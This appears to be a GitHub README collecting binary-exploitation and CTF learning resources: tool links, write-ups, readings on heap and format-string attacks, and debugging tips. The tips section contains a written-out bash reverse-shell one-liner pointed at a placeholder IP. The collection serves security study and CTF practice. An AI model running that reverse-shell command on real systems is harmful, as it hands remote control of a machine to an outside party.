# on-pwning
This repository contains interesting links and notes about pwning stuff, along with my solutions to some CTF challenges.

| Tool | Description |
| -------- | ----------- |
| [flags.py](https://gist.github.com/integeruser/90db09df45d18dcffa95f6635403a84b) | Retrieve back names of header file constants
| [wrapper.py](https://gist.github.com/integeruser/dcf2d1a290db1811e8a26cd7b22e919b) | Normalize environment when running a program with and without GDB |
| [ashell.py](https://gist.github.com/integeruser/0c87f46f82d40a36e6a9901059f09ffd) | A shellcoding helper |
| [s-rand.py](https://gist.github.com/integeruser/4cca768836c68751904fe215c94e914c) | Python port of the GLIBC rng |
| [GDB Cheat Sh*t](https://gist.github.com/integeruser/0c436a64e087b1c43b278761434cbbfa) | A summary of the official GDB documentation |

| CTF | Write-up |
| --- | -------- |
| Google CTF 2017 (Quals) | [Inst Prof](https://secgroup.github.io/2017/06/22/googlectf2017quals-writeup-inst-prof/) |
| FAUST CTF 2017 | [Alexa](https://secgroup.github.io/2017/05/29/faustctf2017-writeup-alexa/) |
| AlexCTF 2017 | [Packed Movement](https://secgroup.github.io/2017/02/06/alexctf2017-writeup-packed-movement/) |
| CSAW 2016 | [Tutorial](https://secgroup.github.io/2016/09/24/csaw2016-writeup-tutorial/) |
| Hack.lu 2015 | [Secret Library](https://secgroup.github.io/2015/10/25/hacklu2015-writeup-secret-library/) |


## Readings

- [A binary analysis, count me if you can](http://shell-storm.org/blog/A-binary-analysis-count-me-if-you-can/)
- [A Eulogy for Format Strings](http://phrack.org/issues/67/9.html)
- [A Memory Allocator](http://g.oswego.edu/dl/html/malloc.html)
- [Collection of Known Patching Techniques](https://github.com/secretsquirrel/the-backdoor-factory/wiki/5.-Collection-of-Known-Patching-Techniques) • elf
- [Common Pitfalls When Writing Exploits](http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html)
- [Controlling uninitialized memory with LD_PRELOAD](http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/)
- [ELF Binary Code Injection, Loader/'Decrypter'](http://www.pinkstyle.org/elfcrypt.html)
- [Exploiting Format String Vulnerabilities](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf)
- [Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)
- [How main() is executed on Linux](http://www.tldp.org/LDP/LG/issue84/hawk.html)
- [How to Create a Virus Using the Assembly Language](https://cranklin.wordpress.com/2016/12/26/how-to-create-a-virus-using-the-assembly-language/)
- [linux-insides](https://0xax.gitbooks.io/linux-insides/)
- [Playing with canaries](https://www.elttam.com.au/blog/playing-with-canaries/)
- [Qualys Security Advisory - The Stack Clash](https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt)
- [Radare2 of the Lost Magic Gadget](https://0xabe.io/howto/exploit/2016/03/30/Radare2-of-the-Lost-Magic-Gadget.html)
- [Return to VDSO using ELF Auxiliary Vectors](http://v0ids3curity.blogspot.it/2014/12/return-to-vdso-using-elf-auxiliary.html)
- [The advanced return-into-lib(c) exploits: PaX case study](http://phrack.org/issues/58/4.html) • ret-into-dl
- [The Art Of ELF: Analysis and Exploitations](http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/)
- [The one-gadget in glibc](https://david942j.blogspot.it/2017/02/project-one-gadget-in-glibc.html)
- [Unix ELF parasites and virus](http://vxheaven.org/lib/vsc01.html)
- [Vudo - An object superstitiously believed to embody magical powers](http://www.phrack.org/issues/57/8.html) • dlmalloc, frontlink, heap, unlink
- [What are vdso and vsyscall?](https://stackoverflow.com/questions/19938324/what-are-vdso-and-vsyscall)
- [What is the difference between .got and .got.plt section?](https://stackoverflow.com/questions/11676472/what-is-the-difference-between-got-and-got-plt-section)
- [What is this protection that seems to prevent ROP when ASLR in ON?](https://reverseengineering.stackexchange.com/questions/13811/what-is-this-protection-that-seems-to-prevent-rop-when-aslr-in-on)


## Exploits

- [Dirty COW and why lying is bad even if you are the Linux kernel](https://chao-tic.github.io/blog/2017/05/24/dirty-cow)
- [Educational Heap Exploitation](https://github.com/shellphish/how2heap)
- [Exploit writing tutorial part 11 : Heap Spraying Demystified](https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/#0x0c0c0c0c)
- [Finding Function's Load Address](http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html) • DT_STRTAB
- [File Stream Pointer Overflows](http://www.ouah.org/fsp-overflows.txt)
- [Fun with FORTIFY_SOURCE](http://vulnfactory.org/blog/2010/04/27/fun-with-fortify_source/)
- [Mental Snapshot - _int_free and unlink](http://uaf.io/exploitation/misc/2016/09/11/_int_free-Mental-Snapshot.html) • free, heap, unlink
- [Pwning (sometimes) with style - Dragons' notes on CTFs](http://j00ru.vexillium.org/slides/2015/insomnihack.pdf)
- [pwnlib.dynelf — Resolving remote functions using leaks](https://docs.pwntools.com/en/stable/dynelf.html)
- [The Malloc Maleficarum](http://packetstorm.foofus.com/papers/attack/MallocMaleficarum.txt)
- [What is vulnerable about this C code?](http://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code) • env
- [x86 Exploitation 101: heap overflows… unlink me, would you please?](https://gbmaster.wordpress.com/2014/08/11/x86-exploitation-101-heap-overflows-unlink-me-would-you-please/) • dlmalloc, heap, unlink


## Talks

- [Black Hat USA 2002 - Fixing/Making Holes in Binaries](https://www.youtube.com/watch?v=18DKETYfvjg)


## Tools

- [The Backdoor Factory](https://github.com/secretsquirrel/the-backdoor-factory)


## Tips and tricks

- `cat /proc/self/maps` for checking if ASLR is enabled or not
- `setarch x86_64 --addr-no-randomize /bin/bash` starts a fresh environment without ASLR (it will break setuid binaries)
- `set exec-wrapper env "LD_PRELOAD=./libc.so.6"` for loading in GDB a custom libc
- insert `\xcc` (INT 3) at the beginning of a shellcode to stop the program executing it and return to the debugger (for testing purposes)
- `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` starts a bash reverse shell


## Write-ups

- [0ctf Quals 2017 - BabyHeap2017](http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html) • fastbins
- [33C3 CTF – babyfengshui](https://galhacktictrendsetters.wordpress.com/2017/01/05/33c3-ctf-babyfengshui/)
- [Exploit Exercise - Format String FORTIFY_SOURCE Bypass](http://v0ids3curity.blogspot.it/2012/09/exploit-exercise-format-string.html) • FORTIFY_SOURCE
- [exploit exercises - protostar - heap levels | research | sprawl](http://thesprawl.org/research/exploit-exercises-protostar-heap/#heap-3)
- [Hack.lu's OREO with ret2dl-resolve](http://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/)
- [Hohoho](https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/misc/hohoho) • bash
- [Nebula level15 write-up](http://www.pwntester.com/blog/2013/11/26/nebula-level15-write-up/) • RPATH
- [Play With Capture The Flag: [Write-up] Google CTF 2017 - pwn474 primary](https://david942j.blogspot.it/2017/06/write-up-google-ctf-2017-pwn474-primary.html)
- [POC exploit for toilet service of FAUST-CTF-2017](https://gist.github.com/m1ghtym0/44a4bdf7621fa60ac8ec69f10b8af5f4)
- [RingZer0Team - Shellcoding](https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md)
